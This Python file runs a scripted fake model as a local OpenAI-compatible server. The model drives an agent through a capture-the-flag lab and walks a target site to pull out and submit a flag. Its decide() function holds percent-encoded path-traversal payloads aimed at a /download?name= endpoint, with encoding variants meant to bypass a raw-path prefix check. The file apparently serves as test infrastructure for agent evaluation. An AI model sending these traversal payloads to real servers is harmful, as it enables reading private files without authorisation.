"""Scripted-but-adaptive fake model exposed as an OpenAI-compatible endpoint.

The agent talks to this server through the real ``agent.model.Model`` client
(``POST /v1/chat/completions``), so the lab exercises the same HTTP contract as
a hosted model. The policy is deterministic yet observation-driven: it reads the
task briefing for the target origin, walks the shelf, performs the percent-
encoded traversal, extracts the flag from the tool observation, and submits it.
It never receives the flag out-of-band.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import re
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

try:  # normal package import
    from .common import append_jsonl, make_dir, now_iso, write_json
except ImportError:  # direct script execution
    from common import append_jsonl, make_dir, now_iso, write_json

MODEL_NAME = "fake-lab-model"
FLAG_RE = re.compile(r"flag\{[0-9a-fA-F]{16,}\}")
URL_RE = re.compile(r"https?://[^\s\"'<>]+")
TRAVERSAL_PAYLOADS = (
    "%2e%2e/private/flag.txt",
    "%2e%2e%2fprivate%2fflag.txt",
    "%2e%2e%5cprivate%5cflag.txt",
)
BRIEF_MARKER = "Task briefing (untrusted):"
OBS_MARKER = "Tool observation (untrusted): "


def _decode_json_at(text: str, start: int):
    try:
        value, _ = json.JSONDecoder().raw_decode(text[start:])
        return value
    except ValueError:
        return None


def parse_briefing(messages: list[dict]) -> dict:
    for message in messages:
        if message.get("role") != "user":
            continue
        content = str(message.get("content") or "")
        index = content.find(BRIEF_MARKER)
        if index < 0:
            continue
        rest = content[index + len(BRIEF_MARKER):].lstrip()
        brace = rest.find("{")
        if brace < 0:
            continue
        brief = _decode_json_at(rest, brace)
        if isinstance(brief, dict):
            return brief
    return {}


def parse_observations(messages: list[dict]) -> list[dict]:
    observations = []
    for message in messages:
        if message.get("role") != "user":
            continue
        content = str(message.get("content") or "")
        index = content.find(OBS_MARKER)
        if index < 0:
            continue
        observation = _decode_json_at(content, index + len(OBS_MARKER))
        observations.append(observation if isinstance(observation, dict) else {"unparsed": True})
    return observations


def _origin_from_briefing(brief: dict, messages: list[dict]) -> str | None:
    candidates = []
    for service in brief.get("target_services") or []:
        if isinstance(service, dict):
            if service.get("url"):
                candidates.append(str(service["url"]))
            elif service.get("host") and service.get("port"):
                candidates.append(f"http://{service['host']}:{service['port']}")
    for entry in brief.get("scope") or []:
        candidates.append(str(entry))
    for candidate in candidates:
        match = URL_RE.search(candidate)
        if match:
            return match.group(0).rstrip("/")
    for message in messages:
        match = URL_RE.search(str(message.get("content") or ""))
        if match:
            return match.group(0).rstrip("/")
    return None


def _question_id(brief: dict) -> str:
    questions = brief.get("questions") or []
    for question in questions:
        if isinstance(question, dict) and question.get("id"):
            return str(question["id"])
    return "flag"


def _http_get(url: str, why: str) -> dict:
    return {"action": "http", "method": "GET", "url": url, "why": why}


def decide(messages: list[dict]) -> dict:
    brief = parse_briefing(messages)
    origin = _origin_from_briefing(brief, messages)
    question_id = _question_id(brief)
    observations = parse_observations(messages)
    if not origin:
        return {"action": "finish", "reason": "fake_model_no_target_origin"}
    if not observations:
        return _http_get(origin + "/", "discover the challenge home page")

    last = observations[-1]
    if "verdict" in last:
        verdict = last.get("verdict") or {}
        if verdict.get("correct"):
            return {"action": "finish", "reason": "flag accepted by the platform"}
        return {"action": "finish", "reason": "submission rejected; not brute-forcing"}
    if last.get("error"):
        failures = sum(1 for item in observations if item.get("error"))
        if failures <= 2:
            return _http_get(origin + "/", "retry target discovery after a tool error")
        return {"action": "finish", "reason": "target unreachable after retries"}

    url = str(last.get("url") or "")
    status = last.get("status")
    body = str(last.get("body_preview") or "")
    flag = FLAG_RE.search(body)
    if flag:
        return {"action": "submit", "question_id": question_id, "answer": flag.group(0),
                "evidence": f"GET {url} returned a flag from outside the public root"}

    traversal_attempts = sum(1 for item in observations
                             if "/download?name=" in str(item.get("url") or "")
                             and ("%2e" in str(item.get("url")) or ".." in str(item.get("url"))))
    home = origin + "/"
    listing = origin + "/files/"
    legit = origin + "/download?name=files/quote.txt"
    if url.rstrip("/") == origin:
        return _http_get(listing, "enumerate the public file shelf")
    if url.rstrip("/") == origin + "/files":
        return _http_get(legit, "fetch one public file through the legacy download endpoint")
    if "download?name=files/quote.txt" in url and status == 200:
        return _http_get(origin + "/download?name=" + TRAVERSAL_PAYLOADS[0],
                         "test percent-encoded traversal past the raw-path prefix check")
    if "/download?name=" in url and status in (400, 403, 404):
        if traversal_attempts < len(TRAVERSAL_PAYLOADS):
            return _http_get(origin + "/download?name=" + TRAVERSAL_PAYLOADS[traversal_attempts],
                             f"try traversal encoding variant {traversal_attempts + 1}")
        return {"action": "finish", "reason": "all traversal encodings rejected"}
    if not any(str(item.get("url") or "").rstrip("/") == origin for item in observations):
        return _http_get(home, "re-discover the home page")
    return {"action": "finish", "reason": "no scripted step left for this observation"}


class ModelState:
    def __init__(self, log_path: Path, model_name: str):
        self.log_path = Path(log_path)
        self.model_name = model_name
        self.lock = threading.Lock()
        self.calls = 0
        self.prompt_tokens = 0
        self.completion_tokens = 0


def _make_handler(state: ModelState):
    class Handler(BaseHTTPRequestHandler):
        server_version = "FakeModel/0.1"
        protocol_version = "HTTP/1.0"

        def log_message(self, *args):
            pass

        def _json(self, status: int, data: dict) -> None:
            body = json.dumps(data, ensure_ascii=False).encode("utf-8")
            self.send_response(status)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            try:
                self.wfile.write(body)
            except (BrokenPipeError, ConnectionAbortedError):
                pass

        def do_GET(self):  # noqa: N802
            if self.path.rstrip("/") in {"/v1/models", "/models"}:
                self._json(200, {"object": "list", "data": [{"id": state.model_name, "object": "model"}]})
            else:
                self._json(404, {"error": {"message": "not found"}})

        def do_POST(self):  # noqa: N802
            if not self.path.startswith("/v1/chat/completions"):
                self._json(404, {"error": {"message": "not found"}})
                return
            start = time.monotonic()
            try:
                length = int(self.headers.get("Content-Length") or 0)
            except ValueError:
                length = 0
            if length <= 0 or length > 2_000_000:
                self._json(400, {"error": {"message": "invalid request size"}})
                return
            try:
                payload = json.loads(self.rfile.read(length))
            except ValueError:
                self._json(400, {"error": {"message": "invalid json"}})
                return
            messages = payload.get("messages") if isinstance(payload, dict) else None
            if not isinstance(messages, list) or not messages:
                self._json(400, {"error": {"message": "messages required"}})
                return
            action = decide([message for message in messages if isinstance(message, dict)])
            content = json.dumps(action, ensure_ascii=False)
            prompt_tokens = max(1, sum(len(str(message.get("content") or "")) for message in messages) // 4)
            completion_tokens = max(1, len(content) // 4)
            with state.lock:
                state.calls += 1
                state.prompt_tokens += prompt_tokens
                state.completion_tokens += completion_tokens
                call_number = state.calls
            # Never log message bodies: observations can contain the flag.
            append_jsonl(state.log_path, {
                "ts": now_iso(),
                "call": call_number,
                "model": state.model_name,
                "action": action.get("action"),
                "method": action.get("method"),
                "url": action.get("url"),
                "prompt_tokens": prompt_tokens,
                "completion_tokens": completion_tokens,
                "elapsed_s": round(time.monotonic() - start, 4),
            }, lock=state.lock)
            self._json(200, {
                "id": f"chatcmpl-fake-{call_number}",
                "object": "chat.completion",
                "created": int(time.time()),
                "model": state.model_name,
                "choices": [{
                    "index": 0,
                    "message": {"role": "assistant", "content": content},
                    "finish_reason": "stop",
                }],
                "usage": {"prompt_tokens": prompt_tokens, "completion_tokens": completion_tokens,
                          "total_tokens": prompt_tokens + completion_tokens},
            })

    return Handler


def main() -> int:
    parser = argparse.ArgumentParser(description="Fake OpenAI-compatible model for the local lab")
    parser.add_argument("--ready-file", required=True)
    parser.add_argument("--log", required=True)
    parser.add_argument("--model-name", default=MODEL_NAME)
    parser.add_argument("--port", type=int, default=0)
    args = parser.parse_args()

    make_dir(Path(args.log).parent)
    make_dir(Path(args.ready_file).parent)
    state = ModelState(Path(args.log), args.model_name)
    server = ThreadingHTTPServer(("127.0.0.1", args.port), _make_handler(state))
    server.daemon_threads = True
    write_json(Path(args.ready_file), {
        "service": "fake_model",
        "port": server.server_port,
        "origin": f"http://127.0.0.1:{server.server_port}",
        "model": args.model_name,
        "api_key_sha256": hashlib.sha256(b"fake-model-key").hexdigest(),
    })
    try:
        server.serve_forever(poll_interval=0.1)
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
